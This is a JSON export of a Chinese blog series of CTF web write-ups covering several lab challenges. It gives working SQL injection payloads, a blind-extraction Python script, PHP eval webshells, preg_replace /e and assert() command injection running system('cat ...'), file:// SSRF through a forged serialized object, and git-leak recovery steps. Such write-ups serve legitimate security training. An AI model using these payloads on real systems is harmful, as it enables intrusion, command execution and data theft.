[{"title":"CTF笔记-WEB攻防-08","date":"2020-10-21T07:40:00.000Z","path":"2020/10/21/ctf/ctf笔记-08/","text":"comment前置知识 git泄露 git版本控制 git版本恢复 sql二次注入(注释式构造) 利用mysql函数load_file()读取文件( + 读取二进制文件使用hex()函数) /etc/passwd关于用户信息的泄露 linux系统的历史指令文件(需有打开控制台的权限，与5.联合使用) .DS_Store泄露 入题 进入页面，只有”发帖”可以点，随便填点什么之后发现需要登录，跳转到了/login.php： burp爆破发现placeholder有提示，上burpsuite使用数字爆破一下。 嘛不过自己在爆破的时候随便猜了一下，发现是666然后过了 之后再用dirsearch扫一下: 123456789101112131415161718192021222324252627282930313233343536373839[02:49:02] Starting:[02:49:03] 403 - 289B - /.git/[02:49:03] 200 - 17B - /.git/COMMIT_EDITMSG[02:49:03] 403 - 298B - /.git/branches/[02:49:03] 200 - 92B - /.git/config[02:49:03] 200 - 145B - /.git/index[02:49:03] 200 - 73B - /.git/description[02:49:03] 403 - 295B - /.git/hooks/[02:49:03] 403 - 294B - /.git/info/[02:49:03] 200 - 240B - /.git/info/exclude[02:49:03] 403 - 294B - /.git/logs/[02:49:03] 301 - 333B - /.git/logs/refs -&gt; http://220.249.52.133:48820/.git/logs/refs/[02:49:03] 301 - 339B - /.git/logs/refs/heads -&gt; http://220.249.52.133:48820/.git/logs/refs/heads/[02:49:03] 200 - 168B - /.git/logs/refs/heads/master[02:49:03] 403 - 297B - /.git/objects/[02:49:03] 403 - 294B - /.git/refs/[02:49:03] 301 - 334B - /.git/refs/heads -&gt; http://220.249.52.133:48820/.git/refs/heads/[02:49:03] 200 - 41B - /.git/refs/heads/master[02:49:03] 301 - 333B - /.git/refs/tags -&gt; http://220.249.52.133:48820/.git/refs/tags/[02:49:03] 403 - 298B - /.htaccess.bak1[02:49:03] 403 - 298B - /.htaccess.orig[02:49:03] 403 - 300B - /.htaccess.sample[02:49:03] 403 - 298B - /.htaccess.save[02:49:03] 403 - 296B - /.htaccessBAK[02:49:03] 403 - 296B - /.htaccessOLD[02:49:03] 403 - 297B - /.htaccessOLD2[02:49:03] 403 - 295B - /.httr-oauth[02:49:04] 403 - 288B - /.php[02:49:11] 301 - 322B - /css -&gt; http://220.249.52.133:48820/css/[02:49:12] 301 - 324B - /fonts -&gt; http://220.249.52.133:48820/fonts/[02:49:12] 200 - 7KB - /index.php[02:49:12] 200 - 7KB - /index.php/login/[02:49:13] 301 - 321B - /js -&gt; http://220.249.52.133:48820/js/[02:49:13] 200 - 2KB - /login.php[02:49:14] 200 - 0B - /mysql.php[02:49:16] 403 - 297B - /server-status[02:49:16] 403 - 298B - /server-status/Task Completed git泄露好家伙，git泄露了，使用githacker下载下来.git文件 发现do_write.php几乎什么也没有，扑了个空？ git 恢复历史版本 以后在面对git泄露的漏洞时，一定要使用git log –reglog查看下历史文件，挨个恢复一遍看看 需要注意到的坑： GitHacker的运行环境为linux 当单次执行时，需要输入以下代码： 1234git initgit add -Agit commit -m \"qwq\"python GitHacker.py [url] 在获取成功后，使用以下指令： 1234567cd [that ip]# 需要进入下载好的文件夹再使用git，否则没有效果git log --reglog# 查看版本号git reset --hard [version]# 恢复历史记录# git reset --hard 2393e10f134536b2141d97819d73a68dec417106 我们终于拿到了关于SQL注入的源码了，接下来让我们开始代码审计 吧。 SQL-二次注入这是截下来的源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpinclude \"mysql.php\";session_start();if($_SESSION['login'] != 'yes')&#123; header(\"Location: ./login.php\"); die();&#125;if(isset($_GET['do']))&#123;switch ($_GET['do'])&#123;case 'write': $category = addslashes($_POST['category']); $title = addslashes($_POST['title']); $content = addslashes($_POST['content']); $sql = \"insert into board set category = '$category', title = '$title', content = '$content'\"; $result = mysql_query($sql); header(\"Location: ./index.php\"); break;case 'comment': $bo_id = addslashes($_POST['bo_id']); $sql = \"select category from board where id='$bo_id'\"; $result = mysql_query($sql); $num = mysql_num_rows($result); if($num&gt;0)&#123; $category = mysql_fetch_array($result)['category']; $content = addslashes($_POST['content']); $sql = \"insert into comment set category = '$category', content = '$content', bo_id = '$bo_id'\"; $result = mysql_query($sql); &#125; header(\"Location: ./comment.php?id=$bo_id\"); break;default: header(\"Location: ./index.php\");&#125;&#125;else&#123; header(\"Location: ./index.php\");&#125;?&gt; (待写完)","tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"https://v25bh145.github.io/tags/ctf-web/"},{"name":"CTF笔记-WEB攻防","slug":"CTF笔记-WEB攻防","permalink":"https://v25bh145.github.io/tags/CTF%E7%AC%94%E8%AE%B0-WEB%E6%94%BB%E9%98%B2/"}]},{"title":"CTF笔记-WEB攻防-07","date":"2020-10-20T09:30:00.000Z","path":"2020/10/20/ctf/ctf笔记-07/","text":"bug 待补充 ics-07我们的工控云管理叕叒出问题啦，点开”项目管理”，进入之后看到最下面有一行”view source”，进入页面，开始审计php: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?php session_start();if (!isset($_GET[page])) &#123; show_source(__FILE__); die();&#125;if (isset($_GET[page]) &amp;&amp; $_GET[page] != 'index.php') &#123; include('flag.php');&#125;else &#123; header('Location: ?page=flag.php');&#125;if ($_SESSION['admin']) &#123; $con = $_POST['con']; $file = $_POST['file']; $filename = \"backup/\".$file; if(preg_match('/.+\\.ph(p[3457]?|t|tml)$/i', $filename))&#123; die(\"Bad file extension\"); &#125;else&#123; chdir('uploaded'); $f = fopen($filename, 'w'); fwrite($f, $con); fclose($f); &#125;&#125;if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== '1' &amp;&amp; substr($_GET[id], -1) === '9') &#123; include 'config.php'; $id = mysql_real_escape_string($_GET[id]); $sql=\"select * from cetc007.user where id='$id'\"; $result = mysql_query($sql); $result = mysql_fetch_object($result);&#125; else &#123; $result = False; die();&#125;if(!$result)die(\"&lt;br &gt;something wae wrong ! &lt;br&gt;\");if($result)&#123; echo \"id: \".$result-&gt;id.\"&lt;/br&gt;\"; echo \"name:\".$result-&gt;user.\"&lt;/br&gt;\"; $_SESSION['admin'] = True;&#125; 第一段是关于页面跳转的，第二段需要获取admin之后再看，先看第三段，是关于id的，这里检测为： 浮点数不为1,且最后一位为9，则执行mysql_real_escape_string()函数，代入sql语句中 关于mysql_real_escape_string函数这是在PHP7.0即已废除的函数，模拟实际情况则以mysqli_real_escape_string(版本&gt;7.0)，我们发现‘被转义了(加了一个反斜杠\\) 我们试着输入1’9，结果发现返回了id和name，并且成功赋值了admin 自己测试说明是可行的： 123456&lt;?php$con = mysqli_connect(\"sth\", \"sth\", \"sth\");$id = \"1'9\";$id = mysqli_real_escape_string($con, $id);$sql=\"select * from cetc007.user where id='$id'\";echo $sql;//select * from cetc007.user where id='1\\'9' 用这样的格式试着查查自己的数据库： 绕过/.+\\.ph(p[3457]?|t|tml)$/i正则 精妙的构造：example.php3/4.php/../ 由此，我们便能随心所欲地写入文件了(记得文件目录是在uploaded下的backup) 1con=&lt;?php+eval($_POST[&quot;hacked&quot;]);?&gt;&amp;file=awa.php/3.php/.. 之后使用菜刀连接，得到flag即可。 后话：以后就一篇一道题了，题的难度越来越大了，写WP所需要的篇幅量也对应增大了。","tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"https://v25bh145.github.io/tags/ctf-web/"},{"name":"CTF笔记-WEB攻防","slug":"CTF笔记-WEB攻防","permalink":"https://v25bh145.github.io/tags/CTF%E7%AC%94%E8%AE%B0-WEB%E6%94%BB%E9%98%B2/"}]},{"title":"CTF笔记-WEB攻防-06","date":"2020-10-14T16:00:00.000Z","path":"2020/10/15/ctf/ctf笔记-06/","text":"草！垃圾typola 待补，这三道题不见了 fakebook首先dirsearch扫一遍，扫到了robors.txt，进入发现文件user.php.bak，下载，开始审计php代码。 看到注册中的$blog是有正则检测的，大概像个网页的样子，使用echo出具体的正则： 123&lt;?phpecho \"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i\";# /^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i 进入菜鸟教程的在线工具练练匹配，发现这样的格式可以匹配到： 1https://a.ab/a?s=a 进入注册页面注册，显示注册完成，并且在跳转出的页面中发现username可以交互，点击一下进入url: 1http://220.249.52.133:43258/view.php?no=1 试着对no=1加了一发单引号，居然引起了mysql的报错，考虑SQL注入。 1?no=1+union+select+1+--+ 提示no hack，试了试/**/与大小写绕过，成功了: 1?no=1/**/unIon/**/Select+1,1,1,1+--+ 问题是不显示结果，把前面的no=1改改，发现在前面无结果报错时，后面的第二个参数能被打印在username栏中： 1?no=0/**/unIon/**/Select+1,2,3,4+--+ # username显示2 尝试查询了所有的数据库，只能发现三个： fakebook information_schema performance_schema 去fakebook查查，发现里面只有自己注册的账号信息。 load_file()我们直接使用load_file访问文件： 1?no=0/**/unIon/**/Select+1,hex(load_file(&quot;/var/www/html/flag.php&quot;)),3,4+--+ 发现flag就在HTML中 笨办法(写py练手用，实则没发现HTML中注释的flag…..)因此flag大概不在数据库中了，也许需要我们通过SQL注入显示系统文件。 1?no=0/**/unIon/**/Select+1,hex(load_file(&quot;/var/www/html/flag.php&quot;)),3,4+--+ 这样子居然报no hack的警告了，发现有关于hex的拦截，/**/与大小写绕过均不可行。问题不大，使用另外一种构造： 1?no=0/**/unIon/**/Select+1,ascii(substr((load_file(&quot;/var/www/html/flag.php&quot;)) from 1 for 1)),3,4+--+ 只能一个一个显示，这里用用python脚本(练个习)： 123456789101112131415import requestsimport reresult = \"\"for i in range(1, 1000): url = r'http://220.249.52.133:43258/view.php?no=0/**/unIon/**/Select+1,ascii(substr((load_file(\"/var/www/html/flag.php\"))' + 'from %d for 1)),3,4+--+'%i # print(url) res = requests.get(url=url) match = re.search(r\"&lt;td&gt;\\s*(\\d+)\\s*&lt;/td&gt;\", res.text) # print(res.text) asc = match.group(1) if asc == '0': break result += chr(int(asc)) # print(result)print(result) WP的办法查到表名之后，我们决定沿着数据库继续走下去，看看我们提交的数据被转储成了什么样子： 123456?no=0/**/union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()+--+# users?no=0/**/union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=database() and table_name=&quot;users&quot;+--+# no,username,passwd,data ?no=0/**/union/**/select 1,group_concat(data),3,4 from users+--+# O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;v25bh145&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:18:&quot;https://a.ab/a?s=a&quot;;&#125; 至此，我们发现我们的信息被反序列化存在data字段中了，同时看到网页底部关于SQL的报错： 1Fatal error: Call to a member function getBlogContents() on boolean in /var/www/html/view.php on line 67 回到user.php.bak中，可以看到这个方法具体是干什么的，在data反序列化之后，里面的blog被用去解析，这里我们可以使用http(s)以外的协议来实现访问服务器内的文件 file://123O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;v25bh145&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;=&gt;?no=0/**/union/**/select 1,2,3,&apos;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;v25bh145&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&apos;+--+ 同样的，在HTML注释(这次是在底部的HTML)中发现了flag。 ics-05首先进行一波dirsearch，什么也没看到，嗯……进入设备维护中心看看扒。 发现全网页只有左上角的”云平台设备维护中心”可以点，进入了一个奇怪的url: 1/index.php?page=index 尝试随便打点什么，发现当输入纯数字与字母时，在底下可以打印(复读)出相应的数字与字母。 打开burp抓包之后使用fuzz字节注入，看看哪些字符是允许的。 结果是没有发现异常，所有除 字母 数字以外的字符均不被允许。 尝试一下SQL注入，果然也不行。 这时，写了index.php，居然反悔了Ok，开始怀疑文件包含漏洞。 php://filter使用php://filter/read=convert.base64-encode/recource=[payload]来写入file参数 1?page=php://filter/convert.base64-encode/resource=index.php 我们即看到了index.php的源码，接下来进行代码审计。 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?php$page = $_GET[$page];if (isset($page)) &#123; if (ctype_alnum($page)) &#123; echo $page; die(); &#125; else &#123; if (strpos($page, 'input') &gt; 0) &#123; die(); &#125; if (strpos($page, 'ta:text') &amp;&amp; 0) &#123; die(); &#125; if (strpos($page, 'text') &amp;&amp; 0) &#123; die(); &#125; if ($page === 'index.php') &#123; die('Ok'); &#125; include($page); die(); &#125;&#125;if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') &#123; echo \"&lt;br --&gt;Welcome My Admin ! &lt;br&gt;\"; $pattern = $_GET[$pat]; $replacement = $_GET[$rep]; $subject = $_GET[$sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125; else &#123; die(); &#125;&#125; 看底下那段代码，需要我们使用X-Forwarded-For定向为127.0.0.1，且这里有一个字符串匹配函数。 preg_replacephp的字符串匹配有个严重的问题： 当匹配的模式(pattern)包含’\\e’时，如果匹配的字符串(subject)与模式(pattern)匹配，则执行$replacement字符串代码 1X-Forwarded-For: 127.0.0.1 123pat=/a/e&amp;rep=system(&apos;ls&apos;)&amp;sub=&quot;a&quot;pat=/a/e&amp;rep=system(&apos;cd+s3chahahaDir%26%26ls&apos;)pat=/a/e&amp;rep=system(&apos;cd+s3chahahaDir/flag%26%26cat+flag.php&apos;)&amp;sub=&quot;a&quot; 在php的system()命令中，可以在字符串中输入多个命令，使用&amp;&amp; =&gt; %26%26拼接。 FlatScience首先使用dirsearch扫一遍，发现robots.txt login.php admin.php三个重要路由，进入robogs.txt康康，里面就是login.php和admin.php。 分别进入两个路由，发现login中是任意用户，admin中仅限用户名为admin，首先从login下手看看。 发现可以进行SQL注入，使用sqlmap，显示数据库为SQLite。 对SQLite尝试注入，之后陷入了短暂的僵局。 接着偶然间查看了下HTML，发现了?debug参数，输入url居然返回了php代码，开始审计php： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;?phpob_start();?&gt;&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;style&gt;blockquote &#123; background: #eeeeee; &#125;h1 &#123; border-bottom: solid black 2px; &#125;h2 &#123; border-bottom: solid black 1px; &#125;.comment &#123; color: darkgreen; &#125;&lt;/style&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=iso-8859-1&quot;&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div align=right class=lastmod&gt;Last Modified: Fri Mar 31:33:7 UTC 1337&lt;/div&gt;&lt;h1&gt;Login&lt;/h1&gt;Login Page, do not try to hax here plox!&lt;br&gt;&lt;form method=&quot;post&quot;&gt; ID:&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;usr&quot;&gt; &lt;br&gt; Password:&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;pw&quot;&gt; &lt;br&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;&lt;/form&gt;&lt;?phpif(isset($_POST[&apos;usr&apos;]) &amp;&amp; isset($_POST[&apos;pw&apos;]))&#123; $user = $_POST[&apos;usr&apos;]; $pass = $_POST[&apos;pw&apos;]; $db = new SQLite3(&apos;../fancy.db&apos;); $res = $db-&gt;query(&quot;SELECT id,name from Users where name=&apos;&quot;.$user.&quot;&apos; and password=&apos;&quot;.sha1($pass.&quot;Salz!&quot;).&quot;&apos;&quot;); if($res)&#123; $row = $res-&gt;fetchArray(); &#125; else&#123; echo &quot;&lt;br&gt;Some Error occourred!&quot;; &#125; if(isset($row[&apos;id&apos;]))&#123; setcookie(&apos;name&apos;,&apos; &apos;.$row[&apos;name&apos;], time() + 60, &apos;/&apos;); header(&quot;Location: /&quot;); die(); &#125;&#125;if(isset($_GET[&apos;debug&apos;]))highlight_file(&apos;login.php&apos;);?&gt;&lt;!-- TODO: Remove ?debug-Parameter! --&gt;&lt;hr noshade&gt;&lt;address&gt;Flux Horst (Flux dot Horst at rub dot flux)&lt;/address&gt;&lt;/body&gt; 我们发现了变量在SQL语句中的引入方式与password的加密方式，并且发现注入数据(name)的结果会存入cookie中。 SQLite表接着尝试注入数据： 1234567891011usr=1&apos; union select 1,sql from sqlite_master where type=&apos;table&apos; and name=&apos;Users&apos;--&amp;pw=1=&gt; CREATE+TABLE+Users%28id+int+primary+key%2Cname+varchar%28255%29%2Cpassword+varchar%28255%29%2Chint+varchar%28255%29%29=&gt;CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255))usr=1&apos; union select 1,hint from Users (where id &gt; 1[,2,...]) --&amp;pw=1=&gt;+my+fav+word+in+my+fav+paper%3F%21+my+love+is%E2%80%A6%3F+the+password+is+password 最后发现，要求将所有的论文下载下来，挨个遍历单词，将所有单词按照sha1(word + &quot;Salz!&quot;)加密，挨个注入admin.php。 最后的脚本和解题我没看，我只知道单词是ThinJerboa，这里出题个人认为实在是太无趣了…","tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"https://v25bh145.github.io/tags/ctf-web/"},{"name":"CTF笔记-WEB攻防","slug":"CTF笔记-WEB攻防","permalink":"https://v25bh145.github.io/tags/CTF%E7%AC%94%E8%AE%B0-WEB%E6%94%BB%E9%98%B2/"}]},{"title":"CTF笔记-WEB攻防-05","date":"2020-10-13T16:00:00.000Z","path":"2020/10/14/ctf/ctf笔记-05/","text":"此题解系ctf笔记-08所补，所以篇幅可能略精简，望见谅。 NewsCenter首先用dirsearch扫了一遍，什么也没发现，robots.txt也是空的。 接着尝试使用单引号闭合搜索框，成功，考虑SQL注入。 使用sqlmap，搞定。 1python sqlmap.py -r postTmp.txt -D news -T secret_table -C fl4g --dump upload1看似为webshell上传，上传一个php: 1&lt;?php eval($_POST[\"awa\"]); ?&gt;php 提示需要使用图片上传，考虑是前端防护，直接打开浏览器调试把”上传”按钮的disable样式去掉，得以上传。 之后使用菜刀连接，地址为网页返回的上传文件路径，后面的口令填上传的变量名 ($_POST[“awa”]则为awa) 成功注入后即可随心所欲访问文件，当然flag也在里面。 mfw首先使用dirsearch进行目录爆破，哦吼，发现一堆.git文件，考虑git泄露。 使用githacker进行攻击，githacker的具体食用方法见ctf笔记-08中。(原本此处用的是githack，但是其由于不能恢复版本，不推荐使用) 查看版本，确定只有一个版本之后，开始审计这个版本的代码。 首先查看flag.php，嗯，在这个git的版本中没东西，看起来需要我们访问现有的flag.php才行。 开始审计index.php: 1234567891011121314151617&lt;?phpif (isset($_GET['page'])) &#123; $page = $_GET['page'];&#125; else &#123; $page = \"home\";&#125;$file = \"templates/\" . $page . \".php\";// I heard '..' is dangerous!assert(\"strpos('$file', '..') === false\") or die(\"Detected hacking attempt!\");// TODO: Make this look niceassert(\"file_exists('$file')\") or die(\"That file doesn't exist!\");?&gt; 需要想办法绕过两个’.’， assert()这道题的漏洞出在assert()中，因为assert()可以执行字符串。 解法 %27.system(&quot;cat%20./templates/flag.php&quot;).%27 =&gt; &apos;.system(&quot;cat ./templates/flag.php&quot;).&apos; =&gt; file_exists(&apos;templates/&apos;.system(&quot;cat ./templates/flag.php&quot;).&apos;.php&apos;) 12345672. ```payload %27)%20or%20phpinfo();%23 # &apos;#&apos;号一定要进行url编码，否则会被忽略掉！ =&gt; &apos;) or phpinfo();#&apos; =&gt; file_exists(&apos;templates/&apos;) or phpinfo();#.php&apos;) flag在HTML的注释中","tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"https://v25bh145.github.io/tags/ctf-web/"},{"name":"CTF笔记-WEB攻防","slug":"CTF笔记-WEB攻防","permalink":"https://v25bh145.github.io/tags/CTF%E7%AC%94%E8%AE%B0-WEB%E6%94%BB%E9%98%B2/"}]},{"title":"CTF笔记-WEB攻防-04","date":"2020-10-11T14:30:00.000Z","path":"2020/10/11/ctf/ctf笔记-04/","text":"NaNNaNNaNNaN-Batman下载附件，打开看到了一堆乱码，看着像是js的审计题 1(可能是由于这段乱码的问题，这篇.md中的汉字全都变成了乱码，所以这里的东西删去了) =&gt; 进行了一波完形填空 仔细对着代码看了看，发现代码是有有序的结构的： 1234_='function $() &#123;/*乱码*/&#125;';for(Y in $='/*乱码*/') with(_.split($[Y]))_=join(pop());eval(_) 于是将eval换成了console，输出了变量_的值： 12345678910111213141516171819202122console.log(_)function $() &#123; var e = document.getElementById(\"c\").value; if (e.length == 16) if (e.match(/^be0f23/) != null) if (e.match(/233ac/) != null) if (e.match(/e98aa$/) != null) if (e.match(/c7be9/) != null) &#123; var t = [\"fl\", \"s_a\", \"i\", \"e&#125;\"]; var n = [\"a\", \"_h0l\", \"n\"]; var r = [\"g&#123;\", \"e\", \"_0\"]; var i = [\"it'\", \"_\", \"n\"]; var s = [t, n, r, i]; for (var o = 0; o &lt; 13; ++o) &#123; document.write(s[o % 4][0]); s[o % 4].splice(0, 1); &#125; &#125;&#125;document.write('&lt;input id=\"c\"&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;');delete _; 这里看到里面有fl a g之类的东西，直接把里面的东西扒下来修改，按格式输出： 1234567891011121314var t = [\"fl\", \"s_a\", \"i\", \"e&#125;\"];var n = [\"a\", \"_h0l\", \"n\"];var r = [\"g&#123;\", \"e\", \"_0\"];var i = [\"it'\", \"_\", \"n\"];var s = [t, n, r, i];var res = \"\";for (var o = 0; o &lt; 13; ++o) &#123; res += s[o % 4][0]; s[o % 4].splice(0, 1);&#125;console.log(res); web2是一道php的审计解密题 12345678910111213141516171819&lt;?php$miwen=\"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws\";function encode($str)&#123; $_o=strrev($str); // echo $_o; for($_0=0;$_0&lt;strlen($_o);$_0++)&#123; $_c=substr($_o,$_0,1); $__=ord($_c)+1; $_c=chr($__); $_=$_.$_c; &#125; return str_rot13(strrev(base64_encode($_)));&#125;highlight_file(__FILE__);?&gt; 这段代码大意为： 反向输出str到$_o中 顺序遍历$_o，将每一位的ascii值+1之后赋予$_ 将$_按顺序base64加密，反转，rot13加密，输出 我们构建出反向解密： 123456789$miwen=\"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws\";$miwen = base64_decode(strrev(str_rot13($miwen)));for($_0=0;$_0&lt;strlen($miwen);$_0++)&#123; $_c=substr($miwen,$_0,1); $__=ord($_c)-1; $_c=chr($__); $_=$_.$_c; &#125;echo strrev($_); PHP2这道题也是php代码审计，不过入口文件很怪，普通的dirsearch搜索不出来，在index.phps 123456789101112131415&lt;?phpif(\"admin\"===$_GET[id]) &#123; echo(\"&lt;p&gt;not allowed!&lt;/p&gt;\"); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == \"admin\")&#123; echo \"&lt;p&gt;Access granted!&lt;/p&gt;\"; echo \"&lt;p&gt;Key: xxxxxxx &lt;/p&gt;\";&#125;?&gt;Can you anthenticate to this website? 很简单，是之前在ctf笔记-03中的warmup的下位替代，直接将admin进行url二次编码即可通过验证： 1?id=%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65","tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"https://v25bh145.github.io/tags/ctf-web/"},{"name":"CTF笔记-WEB攻防","slug":"CTF笔记-WEB攻防","permalink":"https://v25bh145.github.io/tags/CTF%E7%AC%94%E8%AE%B0-WEB%E6%94%BB%E9%98%B2/"}]},{"title":"CTF笔记-WEB攻防-03","date":"2020-10-11T13:00:00.000Z","path":"2020/10/11/ctf/ctf笔记-03/","text":"supersqli sql注入题目 手写先试试万能的单引号，果然报错了： 1error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &apos;&apos;1&apos;&apos;&apos; at line 1 注意一下，第一个’和最后一个’是起标识位置作用的,就是一个单引号,所以原语句是’1’(单引号闭合) 尝试 联合注入payload: 11&apos;+union+select+database()+--+ 返回了一段这样的包含正则匹配的php代码，说明不可行： 1return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject); 堆叠注入 这里先引入一个堆叠注入的方法：用分号闭合原语句，在后面输入任意语句使mysql批量执行。 关于堆叠注入(发现写的很好，搬过来)： 1虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。 在联合注入碰到钉子之后，试图尝试堆叠注入，期望服务器可以返回多行sql语句运行的结果： 11&apos;; show databases; 1234567891011121314151617181920212223242526272829array(1) &#123; [0]=&gt; string(11) &quot;ctftraining&quot;&#125;array(1) &#123; [0]=&gt; string(18) &quot;information_schema&quot;&#125;array(1) &#123; [0]=&gt; string(5) &quot;mysql&quot;&#125;array(1) &#123; [0]=&gt; string(18) &quot;performance_schema&quot;&#125;array(1) &#123; [0]=&gt; string(9) &quot;supersqli&quot;&#125;array(1) &#123; [0]=&gt; string(4) &quot;test&quot;&#125; 进入ctftraining看看，查查里面的表和字段： 1231&apos;; show tables from ctftraining;1&apos;; show columns from FLAG_TABLE from ctftraining; 这里的字段其实是获取不到的，我们无法使用可以绕过正则匹配的命令来获取到字段 再进所在的数据库看看： 1231&apos;; show tables;1&apos;; show columns from words;1&apos;; show columns from `1919810931114514`; 需要注意的是，遇到以数字为表名的表，查询时需要加反引号 12345678910111213141516array(2) &#123; [0]=&gt; string(1) &quot;1&quot; [1]=&gt; string(7) &quot;hahahah&quot;&#125;array(1) &#123; [0]=&gt; string(16) &quot;1919810931114514&quot;&#125;array(1) &#123; [0]=&gt; string(5) &quot;words&quot;&#125; 12345678910111213141516171819202122232425262728array(6) &#123; [0]=&gt; string(2) &quot;id&quot; [1]=&gt; string(7) &quot;int(10)&quot; [2]=&gt; string(2) &quot;NO&quot; [3]=&gt; string(0) &quot;&quot; [4]=&gt; NULL [5]=&gt; string(0) &quot;&quot;&#125;array(6) &#123; [0]=&gt; string(4) &quot;data&quot; [1]=&gt; string(11) &quot;varchar(20)&quot; [2]=&gt; string(2) &quot;NO&quot; [3]=&gt; string(0) &quot;&quot; [4]=&gt; NULL [5]=&gt; string(0) &quot;&quot;&#125; 1234567891011121314array(6) &#123; [0]=&gt; string(4) &quot;flag&quot; [1]=&gt; string(12) &quot;varchar(100)&quot; [2]=&gt; string(2) &quot;NO&quot; [3]=&gt; string(0) &quot;&quot; [4]=&gt; NULL [5]=&gt; string(0) &quot;&quot;&#125; 发现碰钉子了：如何不用select查询数据呢？ =&gt;可以使用rename (alter)命令来输出所想要的表中的字段,也就是偷梁换柱 11&apos;;rename tables `words` to `words1`; rename tables `1919810931114514` to `words`; 现在直接查询id=’1’,发现报错： 1error 1054 : Unknown column &apos;id&apos; in &apos;where clause&apos; 所以我们所伪造的words表还需要一个名为id的字段，我们可以改变字段为id，也可以添加新字段 12ALTER TABLE exampleTable change exampleFiledFrom exampleFiledTo exampleType;ALTER TABLE exampleTable ADD exampleField exampleType; #CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT &apos;&apos; COMMENT &apos;&apos;; 1’; alter table words add id VARCHAR(100); 突然发现环境已经被我们整坏了，因为对id的查询已经失效了，所以只能重启环境来完成实验了() 正确的方法应该是，rename方法与alter方法在同一批次执行，才能保证where id = ‘1’有效。 payload 1:1231&apos;;rename tables `words` to `words1`; rename tables `1919810931114514` to `words`;alter table words add id VARCHAR(100) default 1;1 1231&apos;;rename tables `words` to `words1`; rename tables `1919810931114514` to `words`;alter table words add id VARCHAR(100) default 1;1&apos;; or 1=1; payload 2:1231&apos;;rename tables `words` to `words1`; rename tables `1919810931114514` to `words`;alter table words change flag id VARCHAR(100);1&apos;; or 1=1; sqlmap如果需要使用脚本，脚本的查询很耗时且只使用脚本几乎不可行。 在使用--dbs查询时，只能获取到一个可用supersqli数据库，并且在使用--tabkes查询时，其使用的是暴力查表查询，common常用表一个表也识别不出来，更不用说那一长串发臭的数字，根本匹配不到。 ics-06进入之后是一个dashbord页面，首先dirsearch，发现了index.php，并且总是会重定向到id=1，很奇怪 这道题的解法更离谱，需要使用burp暴力枚举id，会发现id=2333时数据量不一样，出现flag…… warmup进入是个大滑稽(滑稽) 使用dirsearch来一下： 12345678910111213[20:10:25] 403 - 306B - /.htaccess.bak1[20:10:25] 403 - 306B - /.htaccess.save[20:10:25] 403 - 306B - /.htaccess.orig[20:10:25] 403 - 308B - /.htaccess.sample[20:10:25] 403 - 304B - /.htaccessBAK[20:10:25] 403 - 304B - /.htaccessOLD[20:10:25] 403 - 305B - /.htaccessOLD2[20:10:25] 403 - 303B - /.httr-oauth[20:10:34] 200 - 354B - /index.php[20:10:34] 200 - 354B - /index.php/login/[20:10:38] 403 - 305B - /server-status[20:10:38] 403 - 306B - /server-status/[20:10:38] 200 - 8KB - /source.php 进入source.php，看到了php源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [\"source\"=&gt;\"source.php\",\"hint\"=&gt;\"hint.php\"]; if (! isset($page) 